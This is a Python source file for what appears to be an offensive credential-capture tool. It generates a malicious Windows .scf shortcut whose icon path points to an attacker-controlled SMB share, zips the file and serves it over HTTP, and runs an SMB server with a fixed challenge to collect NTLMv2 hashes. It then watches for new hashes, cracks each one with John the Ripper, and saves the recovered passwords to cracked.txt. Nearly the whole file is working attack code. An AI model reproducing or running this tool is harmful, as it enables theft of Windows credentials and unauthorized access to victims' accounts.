import os
import subprocess
import threading
import zipfile
import netifaces
import time
import json

import smb

CONFIG = json.loads(open("config.json", "r").read())

SCF_TEMPLATE = """[Shell]
Command=2
IconFile="//[ip]/share/[icon]"
[TaskBar]
Command=ToogleDesktop"""

SMB_CONFIG_TEMPLATE = """[global]
server_name = AbCdEfGh 
server_os = AbCdEfGh    
server_domain = AbCdEfGh
log_file = None
rpc_apis = yes
credentials_file =
challenge = AAAAAAAAAAAAAAAA
jtr_dump_path = [ntlm_file_path]
SMB2Support = yes

[IPC$]
comment =
read only = yes
share type = 3
path = 

[SHARE]
comment =
read only = yes
share type = 0
path = [smb_path]"""

def _input(text):
    return input(f"\033[90m[ :/ ] \033[94m{text}\033[0m")

def log(text):
    print(f"\033[90m[ :/ ] \033[37m{text}\033[0m")

def success(text):
    print(f"\033[90m[ :/ ] \033[92m{text}\033[0m")

def error(text):
    print(f"\033[90m[ :/ ] \033[91m{text}\033[0m")

def working_on(text):
    print(f"\033[90m[ :/ ] \033[93m{text}\033[0m")

def space():
    print()

class Watcher():

    def __init__(self, filename) -> None:
        self.filename = filename

        open(self.filename, "a").close()

        self._cached_stamp = os.stat(self.filename).st_mtime

        self.thread = threading.Thread(target=self.watch)
        self.thread.start()
    
    def watch(self):
        while True:
            stamp = os.stat(self.filename).st_mtime
            if stamp != self._cached_stamp:
                self._cached_stamp = stamp

                hash = open(self.filename, "r").read().strip().split("\n")[-1]

                if hash:
                    space()
                    working_on("New hash caught")
                    john_crack(hash)

            time.sleep(1)

def john_crack(hash):

    username = hash.split(":")[0]

    log(f"Using john on {username}...")

    filename = f"{int(time.time())}-{username}.hash"
    filepath = os.getcwd() + "/john_workspace/" + filename

    open(filepath, "w").write(hash)

    subprocess.run([CONFIG.get("john_path"), filepath], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)

    result = subprocess.run([CONFIG.get("john_path"), "--show", filepath], capture_output=True, text=True)

    cracked_hash = result.stdout.split("\n\n")[0]

    success("Cracked :)")
    log(":".join(cracked_hash.split(":")[0:2]))

    open("cracked.txt", "a").write(cracked_hash + "\n\n")

    working_on("Saved to cracked.txt")

def list_interfaces():
    return netifaces.interfaces()

def get_interface_ip(interface):
    addresses = netifaces.ifaddresses(interface)
    ip_info = addresses.get(netifaces.AF_INET)
    if ip_info:
        return ip_info[0]['addr']
    return None

def zip_scf():
    with zipfile.ZipFile(f"web_access/{CONFIG.get('zip_file')}", 'w') as zipf:
        zipf.write(f"web_access/{CONFIG.get('scf_file')}", CONFIG.get('scf_file'))

def run_http_server():
    subprocess.run(['python3', '-m', 'http.server', "80"], cwd="web_access", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def update_smb_conf():
    open("smb.conf", "w").write(SMB_CONFIG_TEMPLATE.replace("[ntlm_file_path]", CONFIG.get("ntlm_file_path")).replace("[smb_path]", CONFIG.get("smb_path")))

def main():

    os.system("rm -f *_ntlmv2*")
    
    interfaces = list_interfaces()
    working_on("Available network interfaces:")
    for idx, iface in enumerate(interfaces, start=1):
        log(f"{idx}. {iface}")

    choice = int(_input(f"Choose an interface (1-{len(interfaces)}): "))
    chosen_interface = interfaces[choice - 1]

    ip_address = get_interface_ip(chosen_interface)
    if ip_address:
        success(f"The IP address of {chosen_interface} is {ip_address}")
    else:
        error(f"No IP address found for {chosen_interface}")
        return
    
    open(f"web_access/{CONFIG.get('scf_file')}", "w").write(SCF_TEMPLATE.replace("[ip]", ip_address).replace("[icon]", CONFIG.get("icon")))

    os.system("clear")

    zip_scf()
    log(f"ZIP File: {CONFIG.get('zip_file')}")
    log(f"SCF File: {CONFIG.get('scf_file')}")

    log(f"IP: {ip_address}")

    threading.Thread(target=run_http_server).start()

    log("Running HTTP Server")

    update_smb_conf()
    threading.Thread(target=smb.run, args=(ip_address,)).start()

    log("Runing SMB Server")

    real_filename = os.path.basename(CONFIG.get("ntlm_file_path")).split(".")
    real_filename[-2 if len(real_filename) > 1 else 0] += "_ntlmv2"
    Watcher(os.path.join(os.path.dirname(CONFIG.get("ntlm_file_path")), ".".join(real_filename)))

    log("Watcher started")

if __name__ == "__main__":
    main()
